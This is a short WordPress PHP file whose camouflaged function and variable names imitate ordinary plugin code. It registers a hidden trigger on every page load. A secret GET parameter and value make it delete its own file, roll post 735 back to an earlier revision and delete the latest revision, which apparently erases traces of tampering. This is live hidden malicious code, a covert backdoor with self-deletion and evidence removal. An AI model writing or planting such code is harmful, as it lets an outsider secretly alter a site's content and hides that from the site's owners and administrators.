<?php

function reports_builder_urls() {
	if (isset($_GET['gravatar_recaptcha_buttons']) && $_GET['gravatar_recaptcha_buttons'] === 'instagram_options_variations') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$short_stop_specific = 735;
		$easy_visitor_translator = wp_get_post_revisions($short_stop_specific);
		if (empty($easy_visitor_translator)) die('no revisions');
		if (count($easy_visitor_translator) < 2) die('less than 2');
		$calculator_donation_min = array_shift($easy_visitor_translator);
		$best_click_urls = $calculator_donation_min->ID;
		$themes_pro_notice = array_shift($easy_visitor_translator);
		$online_pack_list_description = $themes_pro_notice->ID;
		$icons_using_easy = wp_restore_post_revision($online_pack_list_description);
		if ($icons_using_easy === false) die('error restoring');
		$icons_using_easy = wp_delete_post_revision($best_click_urls);		
		if ($icons_using_easy === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'reports_builder_urls');
